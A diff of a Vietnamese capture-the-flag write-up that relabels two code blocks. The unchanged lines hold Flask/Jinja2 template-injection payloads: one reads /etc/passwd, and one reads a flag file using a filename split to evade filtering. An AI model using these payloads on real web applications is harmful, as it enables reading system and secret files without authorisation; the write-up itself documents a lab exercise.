@@ -12,7 +12,7 @@ Sau khi đọc source và biết được backend là flask jinja 2 thì có th�
 
 Lên payload all the things chọn một payload thuộc phần read remote file
 
-```php
+```
 {{get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read()}}
 ```
 
@@ -24,7 +24,7 @@ Sửa file `/etc/passwd` thành `[app.py](http://app.py)` để đọc thử th�
 
 Payload
 
-```php
+```
 {{get_flashed_messages.__globals__.__builtins__.open("lag.tx".join("ft")).read()}}
 ```
 
